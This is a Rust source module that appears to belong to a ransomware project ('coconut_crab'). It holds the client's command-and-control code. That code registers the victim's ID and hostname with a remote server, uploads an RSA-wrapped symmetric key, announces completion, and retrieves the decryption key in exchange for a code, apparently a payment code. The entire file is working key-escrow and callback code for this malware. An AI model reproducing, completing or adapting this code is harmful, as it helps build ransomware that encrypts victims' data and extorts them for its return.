use log::{debug, error, info};
use purecrypto::rsa::BoxedRsaPublicKey;
use std::{path::Path, str};
use zeroize::Zeroizing;

use crate::{config, crypto::decrypt_string, status::Status};
use coconut_crab_lib::{
    file::write_to_file,
    web::{
        client::{web_get_recv_bytes, web_post_send_json_recv_text},
        routes,
        structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
        validate::{create_proof, decode_hex},
    },
};

#[derive(Clone, Debug)]
pub struct ServerConn {
    pub fqdn: String,
    pub port: u16,
    pub https: bool,
    pub verify_server: bool,
}

impl ServerConn {
    pub fn new(fqdn: impl Into<String>, port: u16, https: bool, verify_server: bool) -> Self {
        Self {
            fqdn: fqdn.into(),
            port,
            https,
            verify_server,
        }
    }

    pub fn from_config() -> Self {
        Self::new(
            config::SERVER_FQDN.as_str(),
            config::SERVER_PORT,
            config::HTTPS,
            config::VERIFY_SERVER,
        )
    }

    fn base_url(&self, endpoint: &str) -> String {
        let scheme = if self.https { "https" } else { "http" };
        format!("{scheme}://{}:{}{endpoint}", self.fqdn, self.port)
    }
}

fn post_json<T: serde::Serialize>(
    url: &str,
    payload: &T,
    verify_server: bool,
    label: &str,
) -> Result<(), String> {
    let Some(content) = web_post_send_json_recv_text(url, payload, verify_server) else {
        return Err(format!("No response from server for {label}"));
    };
    debug!("Response content text: {content}");
    if content != "Success" {
        return Err(format!("Unexpected {label} response: {content}"));
    }
    Ok(())
}

pub fn write_asym_pub_key_to_disk(
    asym_pub_key: &BoxedRsaPublicKey,
    file_path: &Path,
) -> Result<(), String> {
    let pem_data = asym_pub_key.to_spki_pem();
    match write_to_file(pem_data.as_bytes(), file_path) {
        Ok(()) => {
            info!(
                "Successfully wrote PEM data to file: {}",
                file_path.display()
            );
            Ok(())
        }
        Err(error) => {
            error!("Failed to write PEM data to file: {error}");
            Err(format!("Failed to write public key: {error}"))
        }
    }
}

pub fn download_asym_pub_key(conn: &ServerConn) -> Result<BoxedRsaPublicKey, String> {
    let url = conn.base_url(routes::ASYM_PUB_KEY_PATH.as_str());
    debug!("Asymmetric public key download URL: {url}");
    let content = web_get_recv_bytes(&url, conn.verify_server)
        .ok_or_else(|| "No response downloading public key".to_string())?;
    let pem = str::from_utf8(&content)
        .map_err(|error| format!("Server response is not valid UTF-8: {error}"))?;
    BoxedRsaPublicKey::from_spki_pem(pem)
        .map_err(|error| format!("Failed to parse PEM public key: {error}"))
}

pub fn register(conn: &ServerConn, status: &Status, secret: &str) -> Result<(), String> {
    let url = conn.base_url(routes::REGISTER.as_str());
    let proof_source = [status.id.as_bytes(), status.hostname.as_bytes()].concat();
    let registration = Registration {
        id: status.id.clone(),
        hostname: status.hostname.clone(),
        proof: create_proof(&proof_source, secret),
    };
    post_json(&url, &registration, conn.verify_server, "registration")
}

pub fn upload_sym_key(conn: &ServerConn, status: &Status, secret: &str) -> Result<(), String> {
    let url = conn.base_url(routes::UPLOAD_SYM_KEY.as_str());
    let proof_source = [
        status.id.as_bytes(),
        status.asymmetrically_encrypted_symmetric_key.as_bytes(),
    ]
    .concat();
    let upload_sym_key = UploadSymKey {
        id: status.id.clone(),
        key: status.asymmetrically_encrypted_symmetric_key.clone(),
        proof: create_proof(&proof_source, secret),
    };
    post_json(&url, &upload_sym_key, conn.verify_server, "upload")?;
    info!("Successfully uploaded symmetric key");
    Ok(())
}

pub fn announce_completion(conn: &ServerConn, status: &Status, secret: &str) -> Result<(), String> {
    let url = conn.base_url(routes::ANNOUNCE_COMPLETION.as_str());
    let proof_source = status.id.as_bytes();
    let announce_completion = AnnounceCompletion {
        id: status.id.clone(),
        proof: create_proof(proof_source, secret),
    };
    post_json(&url, &announce_completion, conn.verify_server, "completion")?;
    info!("Successfully announced completion");
    Ok(())
}

fn download_sym_key(
    conn: &ServerConn,
    status: &Status,
    code: &str,
    secret: &str,
) -> Result<Zeroizing<[u8; 32]>, String> {
    let url = conn.base_url(routes::DOWNLOAD_SYM_KEY.as_str());
    let proof_source = [status.id.as_bytes(), code.as_bytes()].concat();
    let download_sym_key = DownloadSymKey {
        id: status.id.clone(),
        code: code.to_string(),
        proof: create_proof(&proof_source, secret),
    };
    let Some(content) = web_post_send_json_recv_text(&url, &download_sym_key, conn.verify_server)
    else {
        return Err("Server did not respond to symmetric key request".to_string());
    };
    let content = Zeroizing::new(content);
    let Some(sym_key) = decode_hex::<32>(&content) else {
        return Err("Server response is not a symmetric key".to_string());
    };
    Ok(Zeroizing::new(sym_key))
}

pub fn get_sym_key(
    conn: &ServerConn,
    status: &Status,
    code: &str,
    preshared_secret: &str,
) -> Result<Zeroizing<[u8; 32]>, String> {
    let key = download_sym_key(conn, status, code, preshared_secret)?;
    let id_ciphertext = hex::decode(&status.symmetrically_encrypted_id)
        .map_err(|error| format!("Unable to decode hex encrypted id: {error}"))?;
    let id_nonce: [u8; 12] = decode_hex(&status.symmetrically_encrypted_id_nonce)
        .ok_or_else(|| "Unable to decode hex nonce".to_string())?;
    let id_tag: [u8; 16] = decode_hex(&status.symmetrically_encrypted_id_tag)
        .ok_or_else(|| "Unable to decode hex tag".to_string())?;
    let decrypt_id_attempt = decrypt_string(
        &id_ciphertext,
        &key,
        &id_nonce,
        &id_tag,
        status.encryption_aad.as_bytes(),
    );
    if decrypt_id_attempt.as_deref() == Some(status.id.as_str()) {
        info!("Received correct symmetric key from server");
        Ok(key)
    } else {
        Err("Received incorrect symmetric key from server".to_string())
    }
}
